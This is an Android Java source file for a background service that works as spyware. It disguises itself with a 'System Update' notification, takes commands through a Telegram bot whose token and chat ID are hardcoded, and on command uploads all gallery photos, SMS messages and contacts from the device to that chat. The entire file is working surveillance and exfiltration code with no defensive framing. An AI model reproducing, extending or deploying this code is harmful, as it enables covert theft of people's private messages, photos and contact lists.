package com.vipih;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class BackgroundService extends Service {
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;

    private volatile long lastUpdateId = 0;
    private volatile boolean isRunning = true;
    private volatile boolean started = false;
    private Context ctx;

    @Override
    public void onCreate() {
        super.onCreate();
        ctx = getApplicationContext();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = "sys_channel";
            NotificationChannel channel = new NotificationChannel(
                channelId, "System Update", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);

            Notification notification = new Notification.Builder(this, channelId)
                .setContentTitle("Update")
                .setContentText("System is running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();

            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notification);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!started) {
            started = true;
            new Thread(this::sendControlPanel).start();
            new Thread(this::pollLoop).start();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void pollLoop() {
        while (isRunning) {
            try { checkUpdates(); } catch (Exception e) { e.printStackTrace(); }
            try { Thread.sleep(500); }
            catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
        }
    }

    private void sendControlPanel() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(API + "/sendMessage");
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");

            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", "✅ Connected successfully!\n\nChoose an action:");

            JSONArray keyboard = new JSONArray();

            JSONArray row1 = new JSONArray();
            JSONObject btnPhotos = new JSONObject();
            btnPhotos.put("text", "📸 Get Photos");
            btnPhotos.put("callback_data", "cmd_photos");
            row1.put(btnPhotos);
            keyboard.put(row1);

            JSONArray row2 = new JSONArray();
            JSONObject btnSms = new JSONObject();
            btnSms.put("text", "💬 Get SMS");
            btnSms.put("callback_data", "cmd_sms");
            row2.put(btnSms);
            keyboard.put(row2);

            JSONArray row3 = new JSONArray();
            JSONObject btnContacts = new JSONObject();
            btnContacts.put("text", "📞 Get Contacts");
            btnContacts.put("callback_data", "cmd_contacts");
            row3.put(btnContacts);
            keyboard.put(row3);

            JSONObject replyMarkup = new JSONObject();
            replyMarkup.put("inline_keyboard", keyboard);
            json.put("reply_markup", replyMarkup);

            try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
                os.writeBytes(json.toString());
                os.flush();
            }
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void checkUpdates() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(API + "/getUpdates?offset=" + (lastUpdateId + 1)
                + "&timeout=10&allowed_updates=%5B%22callback_query%22%5D");
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(20000);

            StringBuilder response = new StringBuilder();
            try (InputStream in = conn.getInputStream();
                 BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {
                String line;
                while ((line = reader.readLine()) != null) response.append(line);
            }

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (!jsonResponse.optBoolean("ok", false)) return;
            JSONArray result = jsonResponse.optJSONArray("result");
            if (result == null) return;

            for (int i = 0; i < result.length(); i++) {
                JSONObject update = result.getJSONObject(i);
                if (update.has("update_id")) {
                    lastUpdateId = Math.max(lastUpdateId, update.getLong("update_id"));
                }
                if (!update.has("callback_query")) continue;

                JSONObject cb = update.getJSONObject("callback_query");
                String data = cb.optString("data", "");
                String cbId = cb.optString("id", "");

                new Thread(() -> answerCallback(cbId, "Processing...")).start();

                switch (data) {
                    case "cmd_photos":   new Thread(this::sendPhotos).start();   break;
                    case "cmd_sms":      new Thread(this::sendSms).start();      break;
                    case "cmd_contacts": new Thread(this::sendContacts).start(); break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void answerCallback(String cbId, String text) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(API + "/answerCallbackQuery?callback_query_id="
                + URLEncoder.encode(cbId, "UTF-8")
                + "&text=" + URLEncoder.encode(text, "UTF-8"));
            conn = (HttpURLConnection) url.openConnection();
            conn.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void sendPhotos() {
        Cursor cursor = null;
        try {
            String[] projection = {MediaStore.Images.Media._ID};
            cursor = ctx.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC");

            if (cursor == null) { sendMsg("⚠️ Photos cursor null"); return; }

            List<Uri> batch = new ArrayList<>();
            while (cursor.moveToNext()) {
                int id = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                batch.add(uri);

                if (batch.size() == 10) {
                    sendMediaGroup(batch);
                    batch.clear();
                    Thread.sleep(300);
                }
            }
            if (!batch.isEmpty()) sendMediaGroup(batch);
            sendMsg("✅ Photos completed.");
        } catch (Exception e) {
            sendMsg("❌ Photos error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private void sendSms() {
        Cursor cursor = null;
        try {
            StringBuilder sb = new StringBuilder();
            cursor = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int addrIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS);
                int bodyIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY);
                do {
                    sb.append("From: ").append(cursor.getString(addrIdx))
                      .append("\nMsg: ").append(cursor.getString(bodyIdx))
                      .append("\n-------------------\n");
                } while (cursor.moveToNext());
            }
            sendFile("messages_sms.txt", sb.toString());
            sendMsg("✅ SMS completed.");
        } catch (Exception e) {
            sendMsg("❌ SMS error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private void sendContacts() {
        Cursor cursor = null;
        try {
            StringBuilder sb = new StringBuilder();
            cursor = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx  = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);
                do {
                    sb.append("Name: ").append(cursor.getString(nameIdx))
                      .append(" | Phone: ").append(cursor.getString(numIdx))
                      .append("\n");
                } while (cursor.moveToNext());
            }
            sendFile("contacts.txt", sb.toString());
            sendMsg("✅ Contacts completed.");
        } catch (Exception e) {
            sendMsg("❌ Contacts error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private void sendMsg(String text) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(API + "/sendMessage?chat_id=" + CHAT_ID
                + "&text=" + URLEncoder.encode(text, "UTF-8"));
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void sendFile(String filename, String content) {
        HttpURLConnection conn = null;
        try {
            String boundary = "*****" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL(API + "/sendDocument");
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream req = new DataOutputStream(conn.getOutputStream())) {
                req.writeBytes(twoHyphens + boundary + lineEnd);
                req.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                req.writeBytes(CHAT_ID + lineEnd);

                req.writeBytes(twoHyphens + boundary + lineEnd);
                req.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"" + lineEnd);
                req.writeBytes("Content-Type: text/plain; charset=utf-8" + lineEnd + lineEnd);
                req.write(content.getBytes("UTF-8"));
                req.writeBytes(lineEnd);
                req.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                req.flush();
            }
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // ---- fixed: separate compression pass so indices in media[] match file parts ----
    private void sendMediaGroup(List<Uri> uris) {
        List<byte[]> images = new ArrayList<>();
        for (Uri u : uris) {
            byte[] data = compressImage(u);
            if (data != null) images.add(data);
        }
        if (images.isEmpty()) return;

        if (images.size() == 1) { sendSinglePhoto(images.get(0)); return; }
        if (images.size() > 10) {
            for (int i = 0; i < images.size(); i += 10) {
                sendMediaGroupBytes(new ArrayList<>(images.subList(i, Math.min(i + 10, images.size()))));
            }
            return;
        }
        sendMediaGroupBytes(images);
    }

    private void sendMediaGroupBytes(List<byte[]> images) {
        HttpURLConnection conn = null;
        try {
            String boundary = "*****" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL(API + "/sendMediaGroup");
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            JSONArray mediaArray = new JSONArray();
            for (int i = 0; i < images.size(); i++) {
                JSONObject m = new JSONObject();
                m.put("type", "photo");
                m.put("media", "attach://file" + i);   // index matches images list, not URI list
                mediaArray.put(m);
            }

            try (DataOutputStream req = new DataOutputStream(conn.getOutputStream())) {
                req.writeBytes(twoHyphens + boundary + lineEnd);
                req.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                req.writeBytes(CHAT_ID + lineEnd);

                req.writeBytes(twoHyphens + boundary + lineEnd);
                req.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
                req.writeBytes(mediaArray.toString() + lineEnd);

                for (int i = 0; i < images.size(); i++) {
                    req.writeBytes(twoHyphens + boundary + lineEnd);
                    req.writeBytes("Content-Disposition: form-data; name=\"file" + i + "\"; filename=\"img" + i + ".jpg\"" + lineEnd);
                    req.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
                    req.write(images.get(i));
                    req.writeBytes(lineEnd);
                }

                req.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                req.flush();
            }
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void sendSinglePhoto(byte[] jpeg) {
        HttpURLConnection conn = null;
        try {
            String boundary = "*****" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL(API + "/sendPhoto");
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream req = new DataOutputStream(conn.getOutputStream())) {
                req.writeBytes(twoHyphens + boundary + lineEnd);
                req.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                req.writeBytes(CHAT_ID + lineEnd);

                req.writeBytes(twoHyphens + boundary + lineEnd);
                req.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"" + lineEnd);
                req.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
                req.write(jpeg);
                req.writeBytes(lineEnd);
                req.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                req.flush();
            }
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private byte[] compressImage(Uri uri) {
        InputStream input = null;
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            input = ctx.getContentResolver().openInputStream(uri);
            if (input == null) return null;
            BitmapFactory.decodeStream(input, null, options);
            input.close();

            int inSampleSize = 1;
            if (options.outHeight > 800 || options.outWidth > 800) {
                final int halfH = options.outHeight / 2;
                final int halfW = options.outWidth / 2;
                while ((halfH / inSampleSize) >= 800 && (halfW / inSampleSize) >= 800) {
                    inSampleSize *= 2;
                }
            }
            options.inJustDecodeBounds = false;
            options.inSampleSize = inSampleSize;

            input = ctx.getContentResolver().openInputStream(uri);
            if (input == null) return null;
            Bitmap bitmap = BitmapFactory.decodeStream(input, null, options);
            input.close();
            if (bitmap == null) return null;

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream);
            bitmap.recycle();
            return stream.toByteArray();
        } catch (Exception e) {
            return null;
        } finally {
            if (input != null) { try { input.close(); } catch (Exception ignored) {} }
        }
    }
}